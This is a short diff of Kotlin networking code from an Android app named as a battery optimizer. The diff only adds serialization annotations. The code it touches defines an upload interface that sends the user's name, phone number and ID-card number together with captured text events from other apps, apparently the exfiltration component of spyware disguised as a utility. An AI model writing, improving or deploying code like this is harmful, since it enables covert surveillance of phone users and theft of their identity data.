@@ -1,32 +1,33 @@
 package com.android.batteryoptimization.network
 
 import com.android.batteryoptimization.InputEvent
-import retrofit2.Response
+import com.google.gson.annotations.SerializedName
+import okhttp3.ResponseBody
 import retrofit2.http.Body
 import retrofit2.http.Header
 import retrofit2.http.POST
 
 data class UploadResponse(
-    val code: Int,
-    val msg: String
+    @SerializedName("code") val code: Int,
+    @SerializedName("msg") val msg: String
 )
 
 data class UploadRequest(
-    val userInfo: UserInfoPayload,
-    val events: List<EventPayload>
+    @SerializedName("userInfo") val userInfo: UserInfoPayload,
+    @SerializedName("events") val events: List<EventPayload>
 )
 
 data class UserInfoPayload(
-    val name: String,
-    val phone: String,
-    val idCard: String
+    @SerializedName("name") val name: String,
+    @SerializedName("phone") val phone: String,
+    @SerializedName("idCard") val idCard: String
 )
 
 data class EventPayload(
-    val packageName: String,
-    val appName: String?,
-    val text: String,
-    val timestamp: Long
+    @SerializedName("packageName") val packageName: String,
+    @SerializedName("appName") val appName: String?,
+    @SerializedName("text") val text: String,
+    @SerializedName("timestamp") val timestamp: Long
 )
 
 interface UploadApi {
@@ -34,5 +35,5 @@ interface UploadApi {
     suspend fun uploadEvents(
         @Header("deviceInfo") deviceInfoJson: String,
         @Body requestBody: UploadRequest
-    ): Response<UploadResponse>
+    ): ResponseBody
 }
